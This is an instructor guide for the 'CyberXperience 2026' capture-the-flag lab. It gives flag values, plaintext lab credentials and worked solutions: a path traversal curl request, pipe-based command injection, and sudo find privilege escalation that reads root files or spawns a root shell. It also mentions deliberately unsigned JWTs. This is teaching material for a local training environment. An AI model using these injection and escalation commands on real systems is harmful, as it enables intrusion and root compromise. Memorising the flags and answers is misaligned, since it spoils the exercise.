# Instructor Guide — CyberXperience 2026

Solutions, flag values, and credentials for the CyberXperience 2026 CTF platform.

> **CONFIDENTIAL — AUTHORIZED INSTRUCTORS ONLY**
> This document contains challenge solutions and plaintext credentials. Do not distribute to participants, post publicly, or commit to a public repository. Access should be restricted to course staff.

---

## Environment Overview

| Service       | Port | URL                        |
|---------------|------|----------------------------|
| frontend      | 3000 | `http://localhost:3000`    |
| gateway       | 4000 | `http://localhost:4000`    |
| web-traversal | 5000 | `http://localhost:5000`    |
| shell-backend | —    | No direct external port; accessed via gateway |

Start all services: `docker-compose up --build`

---

## Flags Reference

| Stage | Flag ID  | Value                                   | Location in container              |
|-------|----------|-----------------------------------------|------------------------------------|
| 1     | `stage1` | `ASG{p4th_tr4v3rs4l_0pen_d00r}`        | `/data/secrets/credentials.txt` (web-traversal) |
| 2     | `stage2` | `ASG{c0mm4nd_1nj3ct10n_p1p3_dr34m}`   | `/home/ctf_user/flag2.txt` (shell-backend) |
| 3     | `stage3` | `ASG{gtf0_f1nd_r00t_4ccess_2026}`      | `/root/root_flag.txt` (shell-backend) |

Flag values are defined in `flags.json` (project root) and injected at container startup.

---

## Credentials Reference

| Field    | Value             | Notes                                      |
|----------|-------------------|--------------------------------------------|
| Username | `ctf_user`        | Shell account in shell-backend container   |
| Password | `r3str1ct3d_2026` | Discovered by completing Stage 1           |

Credentials are hardcoded in `gateway/server.js` (`VALID_CREDENTIALS`). They are also embedded in the `/data/secrets/credentials.txt` file written by `services/web-traversal/create_secrets.sh`.

---

## Solutions

### Stage 1: Path Traversal

**Vulnerability:** `services/web-traversal/app.py` passes the user-supplied `name` query parameter directly to `os.path.join(WEB_ROOT, filename)` without sanitizing `../` sequences.

**Exploit — browser or curl:**

```bash
curl "http://localhost:5000/api/files/read?name=../../../data/secrets/credentials.txt"
```

**Expected output:**

```json
{
  "content": "Username: ctf_user\nPassword: r3str1ct3d_2026\nFlag: ASG{p4th_tr4v3rs4l_0pen_d00r}",
  "filename": "../../../data/secrets/credentials.txt"
}
```

The flag and shell credentials are both in this file. Participants use the credentials to log in via the terminal UI and proceed to Stage 2.

---

### Stage 2: Command Injection

**Vulnerability:** `services/shell-backend/restricted_shell.py` uses `subprocess.run(cmd_input, shell=True)` and validates only the first word of the command against an allowlist (e.g., `help`, `ls`, `echo`). Shell operators like `|` bypass the check.

**Exploit — in the restricted shell via the terminal UI:**

```bash
help | cat /home/ctf_user/flag2.txt
```

**Expected output:**

```
ASG{c0mm4nd_1nj3ct10n_p1p3_dr34m}
```

Any allowlisted command followed by `| <arbitrary command>` works. The pipe is passed to `/bin/sh` because `shell=True`.

---

### Stage 3: Privilege Escalation

**Vulnerability:** `services/shell-backend/ctf_user_sudoers` grants `ctf_user ALL=(ALL) NOPASSWD: /usr/bin/find`. `/usr/bin/find` is listed on GTFOBins and can execute arbitrary commands via `-exec`.

**Exploit — in the shell (Stage 2 injection required to run arbitrary commands):**

```bash
# Step 1: confirm sudo permissions
help | sudo -l
```

Expected output includes: `(ALL) NOPASSWD: /usr/bin/find`

```bash
# Step 2: read the root flag via find's -exec
help | sudo find /root -name root_flag.txt -exec cat {} \;
```

**Expected output:**

```
ASG{gtf0_f1nd_r00t_4ccess_2026}
```

Alternatively, participants may spawn a root shell:

```bash
help | sudo find . -exec /bin/sh \; -quit
```

---

## How to Customize Flags

1. Edit `flags.json` in the project root. Change the `"value"` field for the relevant stage:

   ```json
   { "id": "stage1", "name": "Path Traversal", "value": "ASG{your_custom_flag}" }
   ```

2. Update the matching environment variables in `docker-compose.yml` (shell-backend service):

   ```yaml
   environment:
     - FLAG_STAGE2=ASG{your_custom_flag2}
     - FLAG_STAGE3=ASG{your_custom_flag3}
   ```

   Stage 1's flag is written to `/data/secrets/credentials.txt` at build time by `services/web-traversal/create_secrets.sh` — update that script too if you change the Stage 1 flag value.

3. Rebuild: `docker-compose up --build`

---

## Security Architecture Notes

- **Flag validation is server-side.** The gateway reads `flags.json` at startup and validates submissions at the `/api/validate-flag` endpoint. Flag values are never sent to the browser.
- **JWT uses `alg: none`.** The gateway issues unsigned JWTs. This is intentional for the platform's session tracking but means tokens are client-modifiable. The current stages do not require exploiting this; it is left as an extension challenge.
- **Shell-backend has no exposed port.** It is only reachable via the gateway's Docker API calls (`/var/run/docker.sock`), which spawn a `restricted_shell.py` session per authenticated user.
